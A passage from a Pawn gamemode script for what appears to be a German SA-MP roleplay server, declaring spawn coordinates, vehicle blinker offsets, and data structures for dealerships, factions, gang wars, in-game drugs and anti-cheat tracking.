{6419.48047, -7738.33105, 4.00890,   0.00000, 0.00000, 180.00000},
{6416.33740, -7738.32959, 4.00890,   0.00000, 0.00000, 180.00000},
{6413.24902, -7738.31836, 4.00890,   0.00000, 0.00000, 180.00000},
{6413.24902, -7739.17578, 4.00890,   0.00000, 0.00000, 0.00000},
{6416.33740, -7739.18652, 4.00890,   0.00000, 0.00000, 0.00000},
{6419.48047, -7739.18311, 4.00890,   0.00000, 0.00000, 0.00000},
{6378.96680, -7739.10938, 4.01730,   0.00000, 0.00000, -90.00000},
{1753.99292, -9191.95410, 4.21980,   0.00000, 0.00000, -90.00000},
{1559.54541, -9524.00684, 6.79510,   0.00000, 0.00000, 0.00000},
{1607.41577, -9343.55273, 6.23070,   0.00000, 0.00000, -90.00000},
{1717.15784, -9278.35840, 4.03020,   0.00000, 0.00000, 0.00000},
{6436.70410, -9213.92383, 4.04600,   0.00000, 0.00000, -90.00000},
{2483.00293, -9317.63867, 4.01540,   0.00000, 0.00000, 180.00000},
{1604.95935, -8545.25000, 1.75950,   0.00000, 0.00000, -90.00000},
{1604.92407, -8546.98633, 1.75950,   0.00000, 0.00000, -90.00000},
{1604.90955, -8559.23340, 1.75950,   0.00000, 0.00000, -90.00000},
{1604.92273, -8557.37305, 1.75950,   0.00000, 0.00000, -90.00000},
{1615.23645, -8453.40527, 1.96390,   0.00000, 0.00000, 90.00000},
{6085.28857, -9806.54980, 8.40990,   0.00000, 0.00000, 90.00000},
{3365.36450, -8497.60938, 4.02270,   0.00000, 0.00000, 0.00000},
{3399.64893, -8393.31055, 4.01640,   0.00000, 0.00000, 90.00000}
};
new Float:KnastSpawnsARMY[10][3] = {
{4518.2832,-8685.9658,4.4073},
{4514.6172,-8685.9375,4.4073},
{4510.5337,-8686.5977,4.4053},
{4506.9189,-8686.4385,4.4033},
{4503.5815,-8686.5771,4.4033},
{4503.1997,-8686.3203,8.2723},
{4506.8691,-8686.4854,8.2723},
{4510.5610,-8686.4941,8.2703},
{4513.9282,-8686.7725,8.2703},
{4517.6133,-8686.0537,8.2683}
};
new MEDICDOOR[2];
new PDDOOR[5];
new pfltimer[MAX_PLAYERS];
new HatAuftrag[MAX_PLAYERS];
new eristsani[MAX_PLAYERS];
new Banktuerx[2];
new FWTUER,
FWTUER1,
timerxd[MAX_PLAYERS],timerxd2[MAX_PLAYERS],
Auftragaktiv[MAX_PLAYERS],
mbekommen[MAX_PLAYERS],
Motorschaden2[MAX_VEHICLES];
new Blink[MAX_VEHICLES][4];//Blinker
new BlinkSide[MAX_VEHICLES];
new Float:BlinkR[MAX_VEHICLES];
new BlinkTrailer[MAX_VEHICLES];
new TrailerVehicle[MAX_VEHICLES];//Blinker
new DACHAUF[MAX_VEHICLES];
new PDDOORO1;
new PDDOORO2;
new PDDOORO3;
new PDDOORO4;
new PDDOORO5;
new fwstor[3];
new MCTUER1,MCTUER2;
new sfmedictore[5];
new LSFWTORE[6];
new Buhne[2];
new LCNTORE[2];
new YakuzaTORE[3];
new Towingdoor[4];
new medictorls[5];
new bankzone;
new Spielerpid[MAX_PLAYERS];
//Blaulichter
new PoliceLight[MAX_VEHICLES];
new sirene[MAX_VEHICLES];
new sirene1[MAX_VEHICLES];
new sirene2[MAX_VEHICLES];
new sirene3[MAX_VEHICLES];
new sirene4[MAX_VEHICLES];
new rustlight[2][MAX_VEHICLES];
new ftruck[2][MAX_VEHICLES];
new towlights[1][MAX_VEHICLES];
new mullwag[4][MAX_VEHICLES];
new UCL[MAX_VEHICLES];
new g_Object[10][MAX_VEHICLES];
new g_Object34[2][MAX_VEHICLES];

//CPS

//CPS
new Float:todx[MAX_PLAYERS],Float:tody[MAX_PLAYERS],Float:todz[MAX_PLAYERS];
//Other
new Merkenid[MAX_PLAYERS], machtbereits[MAX_PLAYERS];
new FalschesPasswort[MAX_PLAYERS],Eingeladen[MAX_PLAYERS],Channel[MAX_PLAYERS];
new Benzin[MAX_VEHICLES],Float:BenzinVerbrauch[MAX_VEHICLES],FalscherKraftstoff[MAX_VEHICLES],Motorschaden[MAX_VEHICLES],Meter[MAX_VEHICLES],Meter2[MAX_VEHICLES],Float:VehiclePosX[MAX_VEHICLES],Float:VehiclePosY[MAX_VEHICLES],Float:VehiclePosZ[MAX_VEHICLES];
new Float:Kreditsumme[MAX_PLAYERS],Kreditrate[MAX_PLAYERS];
new OCAus = 1;
new UberweisungPlayer[MAX_PLAYERS],Float:UberweisungGeld[MAX_PLAYERS],UberweisungText[MAX_PLAYERS][50];
new Float:Steuern = 0.1;
new Hungervalue[MAX_PLAYERS],Verhungern[MAX_PLAYERS],Verstrahlen[MAX_PLAYERS],
ppMaske[MAX_PLAYERS], bool:Maskex[MAX_PLAYERS];
new ClickedID[MAX_PLAYERS],Spectate[MAX_PLAYERS];
new PNSEingang,PNSAusgang;
new Respray[MAX_PLAYERS],Tuning_farbe[MAX_PLAYERS],Tune_Farbe1[MAX_PLAYERS];
new TuerSelected[MAX_PLAYERS][2],HouseChosen[MAX_PLAYERS],Inventar[MAX_PLAYERS][100],InventarValue[MAX_PLAYERS],EditingObject[MAX_PLAYERS],EditingObjectModel[MAX_PLAYERS],ObjectShow[MAX_PLAYERS][10],Moebel[MAX_HAEUSER][MAX_INVENTAR],Moebelanzahl[MAX_HAEUSER];
new Moebelmodell[MAX_HAEUSER][100],ObjectSet[MAX_PLAYERS],PlayerClickedObject[MAX_PLAYERS],ClickedInvantarID[MAX_PLAYERS],PlayerClickedObjectModel[MAX_PLAYERS];
new Blaulicht[MAX_VEHICLES];
new Moebelhaus[50];
new AutohausAutos[2][52][2],Autochoose[MAX_PLAYERS],FrakAutochoose[MAX_PLAYERS],AutohausChoose[MAX_PLAYERS];
new Video[MAX_PLAYERS];
new SpielerInventar[MAX_PLAYERS][15][2],InventarClicked[MAX_PLAYERS],InventarClickedUser[MAX_PLAYERS],Float:InventarClickedPreis[MAX_PLAYERS],Waffenangebot[MAX_PLAYERS][2];
new MoebelKategorie[MAX_PLAYERS],MoebelChoose[MAX_PLAYERS];
new Aufzug,AufzugTuer[2],AufzugBereit = 1,EtagenTuer[3][2],EtageChoose = 0,Text3D:EtagenText[3];
new Text3D:LabelPD;
new Float:Fahrpreis[MAX_PLAYERS],TaxiFahrt[MAX_PLAYERS],TaxiFahrer[MAX_PLAYERS];
new Banktuer,Bankfach[15][2];

//Fahrzeuge
//new Trucker[12];
new holzi[5];
new FarmerFahrzeug[20],ReinigungsFahrzeug[10],Taxi[10],Bus[8],Ausstellung[3], Trucker[9];
new KleidungChoose[MAX_PLAYERS];
new Float:Fraktionskasse[18];
new FrakUserSelect[MAX_PLAYERS];
new HatTaser[MAX_PLAYERS],PlayerCuffed[MAX_PLAYERS],TazerBereit[MAX_PLAYERS];
new Medikamente[MAX_PLAYERS],UserChoose[MAX_PLAYERS];
new AutosFahrbar[MAX_PLAYERS];
new AdminObjecte[100],aobjanzahl = 0;
new Waffe[12];
new NummerCall[MAX_PLAYERS][7],HandyAn[MAX_PLAYERS];
new Waffenid[MAX_PLAYERS],Kosten[MAX_PLAYERS];
new InventarShow[MAX_PLAYERS];
new Handycall[MAX_PLAYERS];
new ADACVehicleStream[MAX_VEHICLES];
new FahrschulPruef[MAX_PLAYERS],FahrschulPruef_Fehler[MAX_PLAYERS],Fahrpruefung[MAX_PLAYERS];
new Float:Auftrag[MAX_PLAYERS][2];
new TutZeit[MAX_PLAYERS];
new AdminVehicle[30],adminvehs = 0;
new Buslinie[MAX_PLAYERS];
new AOFCT[MAX_PLAYERS],AOFCW[MAX_PLAYERS char];
new Flash[MAX_VEHICLES];
new FlashTime[MAX_VEHICLES];//Flashlight
new Text3D:taxitext[MAX_VEHICLES];
new taxilabel[MAX_VEHICLES];
new Float:khspawn[4][3] = {
{1767.9098,-9312.8906,8.6505}, // -
{1771.1364,-9312.9551,8.6505}, // -
{1774.4885,-9312.9873,8.6505}, // -
{1777.7456,-9313.0186,8.6505} // -
};

enum eBO {
    bM, Float:bX, Float:bY, Float:bZ, Float:brX, Float:brY, Float:brZ
};

new BlinkOffset[][eBO] = {
    {400, -0.9001, 2.0490, -0.0965, -0.9605, -2.2404, -0.0965},
    {401, -0.9686, 2.5393, 0.0235, -0.9970, -2.2863, 0.0235},
    {402, -0.8788, 2.5160, -0.0565, -0.9208, -2.5936, 0.0435},
    {403, -1.3897, 3.6007, -0.2194, -1.1904, -0.9415, 1.8389},
    {404, -0.7236, 2.1715, -0.0365, -0.7906, -2.7052, 0.0635},
    {405, -0.9127, 2.2766, -0.0565, -0.8723, -2.6526, -0.0565},
    {406, -2.2165, 4.9242, -0.0332, -2.0785, -5.2054, 0.5468},
    {407, -0.9887, 4.0622, -0.0913, -1.0141, -3.4034, -0.0913},
    {408, -0.9659, 4.7615, -0.2513, -0.8430, -3.9722, -0.5113},
    {409, -0.7859, 3.5522, -0.0313, -0.8027, -3.8228, -0.0313},
    {410, -0.825, 2.105, 0.0635, -0.8723, -2.1926, 0.1235},
    {411, -0.9405, 2.6710, -0.1825, -0.9636, -2.4525, 0.0825},
    {412, -0.8965, 2.6478, -0.0575, -0.9592, -3.4870, -0.1575},
    {413, -0.8669, 2.5464, -0.0913, -0.8209, -2.5829, 0.0687},
    {414, -0.8069, 2.7473, 0.0087, -0.9058, -3.2050, 0.1094},
    {415, -0.8738, 2.4866, -0.2357, -0.7792, -2.3501, 0.0450},
    {416, -0.8469, 2.9073, 0.0087, -1.0352, -3.5937, 1.4522},
    {417, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {418, -0.9511, 2.3820, -0.2357, -1.0081, -2.4904, -0.1557},
    {419, -1.0742, 2.3978, -0.1757, -0.8127, -2.8620, -0.1557},
    {420, -1.0142, 2.2978, -0.0157, -0.9637, -2.6744, 0.0043},
    {421, -0.9013, 2.5343, -0.1357, -0.5921, -2.9228, -0.1957},
    {422, -0.7813, 2.1543, -0.2657, -0.8985, -2.4349, -0.1057},
    {423, -0.7817, 2.2093, -0.0313, -0.8340, -2.1794, 0.0596},
    {424, -0.7350, 1.4505, 0.1087, -0.7062, -1.4778, 0.2996},
    {425, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {426, -1.0006, 2.3164, -0.0100, -0.9627, -2.6930, -0.0100},
    {427, -0.8728, 2.5856, 0.1887, -0.9831, -3.8383, -0.3495},
    {428, -0.8728, 2.5856, -0.2103, -0.9045, -2.8871, 1.2466},
    {429, -0.7942, 2.2846, -0.2500, -0.8397, -2.3849, -0.0070},
    {430, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {431, -0.9771, 5.8479, 0.3497, -1.0300, -5.7043, -0.1041},
    {432, -1.7168, 4.0330, 0.4497, -1.5830, -4.3414, 0.7039},
    {433, -1.2619, 3.7708, -0.2163, -1.2966, -4.6534, -0.1051},
    {434, 0.0, 0.0, 0.0, -0.4811, -1.9838, -0.0670},
    {435, 0.0000, 0.0000, 0.0000, -1.0697, -3.9690, -1.1053}, //trailer
    {436, -0.8495, 2.2519, -0.0070, -0.8948, -2.4838, 0.1130},
    {437, -1.1156, 5.5395, -0.2163, -0.9856, -5.3099, 1.6458},
    {438, -1.1128, 2.3675, -0.2870, -1.0992, -2.4601, -0.2870},
    {439, -0.8381, 2.3101, -0.1470, -0.8221, -2.6534, -0.1070},
    {440, -0.8270, 2.5573, -0.3173, -0.8676, -2.5376, -0.0149},
    {441, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {442, -1.0354, 2.8278, -0.1870, -1.0226, -3.0877, -0.1270},
    {443, -1.0610, 5.7528, -0.9573, -1.2388, -7.1392, -0.8250},
    {444, -0.9880, 2.7188, 0.6140, -1.0722, -3.0184, 0.7248},
    {445, -0.9590, 2.3460, -0.0840, -0.9773, -2.8049, -0.0840},
    {446, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {447, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {448,  -0.1992, -0.9229, -0.1270},
    {449, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {450,  0.0000, 0.0000, 0.0000, -1.0697, -3.9690, -1.1053}, //trailer
    {451, -0.9826, 1.9642, -0.1399, -0.8894, -2.3991, -0.0199},
    {452, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {453, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {454, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {455, 0.0000, 0.0000, 0.0000, -1.3866, -4.5162, -0.7399},
    {456, 0.0000, 0.0000, 0.0000, -1.3045, -4.6123, 0.4601},
    {457, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {458, -0.9513, 2.4197, -0.1399, -0.9703, -2.7779, 0.0201},
    {459, -0.8214, 2.5716, -0.1274, -0.8760, -2.5775, 0.1127},
    {460, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {461, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {462, 0.0000, 0.0000, 0.0000, -0.2054, -0.9359, -0.1399},
    {463, -0.2276, 0.7185, 0.3201, -0.1952, -1.0037, 0.1601},
    {464, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {465, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {466, 0.0000, 0.0000, 0.0000, -1.0201, -2.7994, 0.0401},
    {467, 0.0000, 0.0000, 0.0000, -0.9401, -3.0594, 0.1601},
    {468, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {469, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {470, -1.0259, 2.1382, 0.2001, -1.0433, -2.5463, 0.1201},
    {471, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {472, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {473, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {474, 0.0000, 0.0000, 0.0000, -0.9833, -2.7663, -0.0599},
    {475, -0.8681, 2.4086, -0.3399, -0.8632, -2.7629, -0.2399},
    {476, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {477, -0.8081, 2.6686, -0.1999, -0.9945, -2.6987, 0.0801},
    {478, -1.0938, 2.0255, 0.1001, -1.0579, -2.5378, -0.2799},
    {479, -0.9671, 2.4844, 0.0201, -0.9578, -2.7556, 0.0601},
    {480, -0.5897, 2.2607, -0.4399, -0.9183, -2.3388, -0.1399},
    {481, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {482, -0.8841, 2.4094, -0.3399, -0.8685, -2.5676, 0.0201},
    {483, -0.7770, 2.6235, -0.0199, -0.6709, -2.7712, -0.1999},
    {484,  0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {485, -0.6104, 1.7180, 0.2201, -0.7074, -1.3681, 0.1201},
    {486, 0.0000, 0.0000, 0.0000, -0.5919, -3.2353, 0.9601},
    {487, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {488, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {489, -1.1024, 2.5796, 0.0401, -1.1261, -2.6473, 0.1601},
    {490, -1.0971, 3.1462, 0.0401, -1.1327, -3.1055, 0.1601},
    {491, -0.8495, 2.5284, -0.0799, -0.8870, -2.7776, 0.0001},
    {492, -0.7905, 2.4656, -0.0599, -0.9075, -2.8130, 0.0001},
    {493, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {494, -0.8513, 2.3630, -0.2199, -0.8275, -2.8485, 0.1401},
    {495, -1.0909, 2.3818, 0.0001, -1.1540, -2.1156, -0.0399},
    {496, -0.9219, 2.1787, 0.0401, -0.7095, -2.1087, 0.0801},
    {497, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {498, -0.8915, 3.0670, 0.2201, -0.9740, -3.0460, 0.3601},
    {499, -0.7725, 2.4576, -0.1999, -1.1318, -3.4186, 0.1401},
    {500, -0.9152, 1.9097, -0.0355, -0.7552, -1.9266, -0.0355},
    {501, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {502, -0.8723, 2.5986, -0.1770, 0.0, 0.0, 0.0},
    {503, -0.8579, 2.3582, -0.0213, 0.0, 0.0, 0.0},
    {504, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {505, -1.1068, 2.5744, 0.0086, -1.1365, -2.6250, 0.1679},
    {506, -0.7672, 2.2106, -0.3185, -0.9113, -2.3474, -0.0273},
    {507, -1.1143, 2.6057, -0.0456, -1.1410, -2.9714, -0.0456},
    {508, -0.7012, 3.0199, -0.6678, -1.3807, -3.3356, 1.2628},
    {509, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {510, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {511, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {512, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {513, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {514, -1.2341, 4.2204, 0.0806, 0.0, 0.0, 0.0},
    {515, -1.4241, 4.4811, -0.7354, -1.2973, -4.8274, -0.8974},
    {516, -0.9512, 2.7208, -0.0543, -0.9926, -2.7809, -0.0348},
    {517, -0.9401, 2.7868, -0.0726, -1.0208, -2.7461, -0.1324},
    {518, -0.9166, 2.6548, -0.0487, -1.0124, -2.8219, -0.0487}, //fake
    {519, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {520, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {521, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {522, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {523, -0.2607, 0.6038, 0.2881, -0.1973, -0.9958, 0.0638},
    {524, -0.9279, 3.6538, -0.0473, -1.3003, -3.9309, -1.0661}, //fake back
    {525, -0.8576, 2.9431, 0.1425, -1.0428, -2.9851, -0.1486}, //fake back
    {526, -0.9421, 2.3087, -0.1128, -0.9559, -2.2882, -0.0411},
    {527, -0.9351, 2.4078, -0.0242, -0.9825, -2.2344, 0.0844},
    {528, -0.8783, 2.5102, -0.1526, -0.8133, -2.5965, -0.3237}, //fake back
    {529, -1.0177, 2.5256, 0.0698, -1.0505, -2.5713, 0.2047},
    {530, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {531, -0.4216, 1.5030, -0.1191, -0.5225, -1.0517, 0.4484}, //fake
    {532, -4.0331, 3.9619, -0.9118, -1.5976, -0.3739, 0.4484}, //fake!
    {533, -0.9410, 2.3774, 0.0985, -0.9852, -2.4663, -0.0020},
    {534, -1.0159, 2.9278, -0.1698, -0.8236, -2.7548, -0.0574},
    {535, -0.8265, 2.5014, -0.2084, -0.9267, -2.6058, -0.1784},
    {536, -0.8577, 2.3943, -0.1248, -0.8736, -3.0999, -0.0900},
    {537, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {538, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {539, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {540, -0.9827, 2.5810, -0.1248, -1.0597, -2.7121, -0.0842},
    {541, -0.6055, 2.3378, -0.2108, -0.7826, -2.1992, 0.0913},
    {542, -0.9712, 2.6252, -0.0064, -0.8281, -2.9729, -0.0577},
    {543, -0.8414, 2.2904, 0.0719, -0.9831, -2.6214, -0.0116}, //fake front
    {544, -0.7346, 3.5720, 0.0200, -0.8597, -3.2242, -0.5918},
    {545, -0.4372, 1.6776, -0.0400, -0.7955, -2.0453, -0.2888},
    {546, -1.1294, 1.0702, 0.0719, -1.0580, -2.6948, 0.0719},
    {547, -0.9582, 2.5222, 0.0271, -0.9937, -2.5915, 0.0719},
    {548, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {549, -0.9264, 2.4914, 0.0271, -0.9070, -2.5802, 0.0271},
    {550, -1.0477, 2.5642, -0.1807, -1.0302, -2.6549, -0.1297},
    {551, -0.9334, 2.6344, -0.0448, -0.9785, -3.0524, 0.0366},
    {552, -0.8757, 3.0634, 0.3600, -0.9933, -2.9119, 0.4752},
    {553, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {554, -0.9409, 2.5345, 0.0600, -1.1112, -2.8095, 0.0651},
    {555, -0.9236, 1.1282, -0.0462, 0.0, 0.0, 0.0},
    {556, -0.9686, 2.5396, 0.5800, -1.1128, -2.8895, 0.7691},
    {557, -0.9886, 2.4796, 0.7000, -1.0904, -2.7699, 0.6871},
    {558, -0.9452, 2.0854, 0.0836, -0.9187, -2.4047, 0.3185},
    {559, -0.9037, 2.4333, -0.0168, -0.8819, -2.2910, 0.1482},
    {560, -0.9347, 2.5097, -0.2644, -0.9639, -2.2337, 0.1259},
    {561, -0.9157, 2.5754, -0.0857, -0.9317, -2.5444, -0.0191},
    {562, -0.9299, 2.3759, 0.0201, -0.8575, -2.2773, 0.1659},
    {563, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {564, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {565, -0.8503, 2.0545, 0.0346, -0.9249, -1.9224, 0.0816},
    {566, -0.9539, 2.7226, 0.0346, -0.9506, -2.9199, 0.0346},
    {567, -0.9942, 2.9212, -0.1543, -1.0077, -2.9164, -0.1543},
    {568, -0.2962, 2.0729, -0.0171, -0.2384, -1.2180, 0.0720},
    {569, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {570, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {571, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {572, -0.3095, 0.7291, -0.0971, -0.4318, -0.8940, -0.0510},
    {573, -0.7949, 3.0624, -0.3371, -0.8727, -3.0917, -0.4540},
    {574, -0.4348, 1.6912, -0.2171, -0.4277, -1.1358, -0.2069},
    {575, -0.9483, 2.3252, 0.1334, -0.9173, -2.7359, -0.0291},
    {576, -0.9948, 2.4505, 0.1883, -0.9983, -3.1357, -0.0291},
    {577, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {578, -1.0478, 4.3687, -0.1800, -1.1188, -5.3472, -0.5099},
    {579, -1.0598, 2.3634, 0.1013, -1.0873, -2.7596, 0.1013},
    {580, -0.7970, 2.6313, -0.2429, -1.0776, -2.8302, 0.1013},
    {581, 0.0, 0.0, 0.0, -0.1975, -1.0375, 0.3448},
    {582, -0.8583, 2.4404, -0.0571, -0.9214, -3.3625, 0.0521},
    {583, -0.5225, 1.3799, 0.2429, -0.5486, -1.5684, 0.2462},
    {584, 0.0, 0.0, 0.0, -1.0452, -4.3338, -0.7298}, //trailer
    {585, -1.0068, 2.7905, 0.0907, -0.9760, -3.0160, 0.2088},
    {586, -0.2872, 0.5383, 0.2009, -0.1703, -1.3533, 0.2784},
    {587, -1.0236, 2.1415, -0.2834, -1.0832, -2.4851, 0.1047},
    {588, -1.0116, 3.3590, 0.1029, -1.0679, -3.9639, -0.3029},
    {589, -0.8107, 2.3905, 0.1834, -0.9605, -2.2799, 0.3761},
    {590, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {591, 0.0, 0.0, 0.0, -1.0590, -3.9902, -1.0809}, //trailer
    {592, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {593, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {594, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {595, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {596, -1.0419, 2.2929, -0.0255, -1.0332, -2.6951, 0.0005},
    {597, -1.0419, 2.2929, -0.0255, -1.0332, -2.6951, 0.0005},
    {598, -1.0423, 2.3495, 0.0600, -1.0326, -2.6930, 0.0600},
    {599, -1.0837, 2.5663, 0.0301, -1.1267, -2.6290, 0.1451},
    {600, -0.8782, 2.6525, -0.0344, -1.0586, -2.6696, 0.0596},
    {601, -0.8094, 3.0084, 0.5429, -0.9321, -3.0808, 0.9071},
    {602, -1.0297, 2.0487, -0.0543, -0.8907, -2.5334, -0.3228},
    {603, -0.9069, 2.6672, -0.1335, -0.8647, -2.5991, -0.1335},
    {604, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {605, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {606, 0.0, 0.0, 0.0, -0.5702, -1.5842, 0.7956}, //trailer
    {607, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {608, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {609, -0.8972, 3.0244, 0.2629, -0.9349, -2.9809, 0.2791},
    {610, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {611, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0}
    //END GTA CARS
};



//Autohaus
#define MAX_AAUTOS 300
enum autohausdaten
{
	iID,
	iModel,
	Float:iX,
	Float:iY,
	Float:iZ,
	Float:iA,
	Float:iPreis,
	iCreate,
	erstellt
}
new AutoInfo[MAX_AAUTOS][autohausdaten];
enum spielerauto
{
	sID,
	sModel,
	Float:sPreis,
	Float:sX,
	Float:sY,
	Float:sZ,
	Float:sA,
	sKilometer,
	Float:sZustand,
	sKennzeichen[10],
	abgeschleppt,
	sreperatur,
	sNitro,
	sHydraulik,
	sFarbe1,
	sFarbe2,
	sTank,
	sMotorschaden,
	sautoneu
}
new SAuto[MAX_PLAYERS][2][spielerauto];


new mussspeichern[MAX_PLAYERS];
new welcherslot[MAX_PLAYERS];
enum autotuning
{
	sID,
	Slot,
	SideL,
	SideR,
	Auspuff,
	Spoiler,
	Dach,
	VStos,
	HStos,
	Paintjob,
	Reifen
}
new STuning[MAX_PLAYERS][2][autotuning];

//Gangwar
enum gangwarinfo
{
	GWID,
	GWBesitzer,
	GWName,
	GWFarbe2[40],
	Float:GWmX,
	Float:GWmY,
	Float:GWMX,
	Float:GWMY,
	GWZone

}
new GWInfo[5][gangwarinfo];
new gangwarneustart,gangwarteam2,gangwaran,gangwarteam1;
new gangwarteam1kills,gangwarteam2kills,gangwarzonenid,Mitglied[MAX_PLAYERS];
new Float:gwminx,Float:gwminy,Float:gwmaxx,Float:gwmaxy;


new warn[MAX_PLAYERS];
new waitwarn[MAX_PLAYERS];
new adienst[MAX_PLAYERS];
new autovid[MAX_PLAYERS],autokey[MAX_PLAYERS],Float:autopreis[MAX_PLAYERS],idein[MAX_PLAYERS];
enum wInfo
{
	sWaffe,
	sMuni
}

new SpielerWaffen[MAX_PLAYERS][13][wInfo];

enum cInfo
{
	Float:cLeben,
	Float:cRuestung,
	cSprung,
	cAnti,
	Float:cPosX,
	Float:cPosY,
	Float:cPosZ,
	cTeleportWarns,
	cAirbreakWarns
}
new AntiCheat[MAX_PLAYERS][cInfo];

enum FFinfo
{
	FID,
	FModell,
	FRang,
	Float:FX,
	Float:FY,
	Float:FZ,
	Float:FRZ,
	FKilometer,
	Float:FPreis,
	Float:FZustand,
	FAbgeschleppt,
	FSQLID
}
new FrakFahrzeuge[18][20][FFinfo],FrakFahrzeugeAnzahl[18],FrakFahrzeugeFarben[18][2] = {
{0,0},//Zivi
{54,1},//LSPD
{25,1},//SFPD
{1,6},//frsf
{1,3},//frls
{1,6},//ADAC
{165,64},//RADIO
{249,1},//BALLAS
{234,1},//GROVE
{135,1},//ATZE
{109,109},//RUSSIA
{0,0},//YAKUZA
{252,252},//Hitman
{1,6},//MDSF
{158,158},//FSLV
{99,99},//Army
{6,1},//Vagos
{125,1}//Mayans MC
};
new Text:LoginDraw[14];
new Text:RegisterDraw[14];
enum HeInfo
{
    hUser,
    Float:hBetrag
};
new Heilung[MAX_PLAYERS][HeInfo];
enum scInfo
{
	sBesitzer,
	sZone,
	sPickup,
	sZoneName[6],
	sEinnahmeZeit,
	sAngreifer,
	sBesitzerKills,
	sAngreiferKills
}

enum _drogen
{
	Float:Gras,
	Float:Koks,
	Float:LSD,
	MengeGras,
	MengeKoks,
	MengeLSD,
	gTuer,
	gPickup,
	gPickupVerkauf
}
//verteidigerSpawn | AngreiferSpawn
new Float:GangDrogen[4][_drogen],Schwarzmarkt[5][scInfo],SpawnSchutz[MAX_PLAYERS],SMarktChoose[MAX_PLAYERS][2];

new GangColor[4] = {0x00B700FF,0x38D9EBFF,0x000000C0,0xDEDBD8B9};

new Float:Buslinien[15][3] = {
{1786.4922,-9319.8838,3.3247},
{1591.8005,-9405.4658,5.4868},
{1701.0162,-9163.4463,3.3234},
{1824.4719,-8769.8516,3.3139},
{1663.9772,-8494.2842,3.3174},
{4353.9771,-7654.0522,3.3151},
{6425.6064,-7718.7656,3.3192},
{6530.1880,-7849.7944,3.3198},
{6330.1797,-9397.6855,3.3051},
{6479.1138,-9249.0518,3.3150},
{5688.4897,-9294.4258,3.3133},
{4561.9834,-9294.3906,3.3188},
{4068.2747,-9294.3477,3.3156},
{2491.7258,-9294.6680,3.3172},
{1686.9141,-9283.5771,3.5026}
};


new PayNSprayFarben[64][2] = {
	{0x000000FF,0},
	{0xF5F5F5FF,1},
	{0x2A77A1FF,2},
	{0x840410FF,3},
	{0x263739FF,4},
	{0x86446EFF,5},
	{0xD78E10FF,6},
	{0x4C75B7FF,7},
	{0xBDBEC6FF,8},
	{0x5E7072FF,9},
	{0x46597AFF,10},
	{0x5D7E8DFF,12},
	{0x58595AFF,13},
	{0xD6DAD6FF,14},
	{0x9CA1A3FF,15},
	{0x335F3FFF,16},
	{0x730E1AFF,17},
	{0x7B0A2AFF,18},
	{0x9F9D94FF,19},
	{0x732E3EFF,21},
